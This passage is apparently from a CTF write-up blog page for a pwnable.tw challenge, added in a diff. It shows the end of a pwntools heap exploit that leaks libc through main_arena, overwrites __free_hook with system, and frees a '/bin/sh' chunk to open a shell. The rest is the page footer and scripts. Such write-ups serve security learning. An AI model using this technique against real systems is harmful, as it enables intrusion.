+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x61</span>) <span style="color:#f92672">+</span> p64 (name <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>))
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;81&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123&#39;</span>)
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;81&#39;</span>, p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x21</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12345&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;70&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123456&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x51</span>) <span style="color:#f92672">+</span> p64 (name <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;70&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1234567&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;This is for later exlpoit ####################################################################################################3&#34;</span>)    
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12345&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;50&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123456&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;70&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12345678&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>    info(p)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil (p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x501</span>))
+</span></span><span style="display:flex;"><span>    main_arena <span style="color:#f92672">=</span> u64 (p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> main_arena <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebca0</span>
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#39;The address of main_arena is : &#39;</span>, hex (main_arena))
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The address of libc is : &#34;</span>, hex (libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x41</span>) <span style="color:#f92672">+</span> p64 (libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;50&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1234567&#39;</span>)
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;50&#39;</span>, p64 (libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;30&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/pwnable.tw/">Pwnable.tw</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="//localhost:1313/blogs/hacknote/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Hacknote (200 pts) - pwnable.tw</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="//localhost:1313/">NguyenDD&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
